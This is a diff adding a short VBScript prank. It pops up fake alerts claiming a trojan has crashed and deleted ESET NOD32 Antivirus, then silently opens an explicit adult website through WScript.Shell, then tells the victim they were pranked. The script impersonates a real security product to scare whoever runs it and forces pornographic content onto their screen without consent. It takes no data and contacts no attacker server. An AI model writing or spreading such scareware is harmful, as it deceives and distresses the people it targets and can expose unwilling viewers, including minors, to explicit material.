@@ -1,0 +1,10 @@
+X=MsgBox("Virus Detected on BullSF Launcher.",0+64,"Virus Detected")
+X=MsgBox("Activate ESET NOD32 Antivirus?",4+16,"Virus Detected") 
+X=MsgBox("ESET NOD32 Antivirus Crashed.",5+16,"Virus Detected")
+X=MsgBox("Trojan Detected.",0+16,"Update") 
+X=MsgBox("ESET NOD32 Antivirus has been deleted, by Trojan Virus",0+16,"Update")
+X=MsgBox("Redownload ESET NOD32 Antivirus?",4+16,"Update")
+X=MsgBox("Download Failed.",0+16,"Update")
+set shl=CreateObject("Wscript.shell")
+shl.run "www.xnxx.com"
+X=MsgBox("Jokes on you. hahaahh lol YOU GOT PRANKED XD.",0+64,"Update")
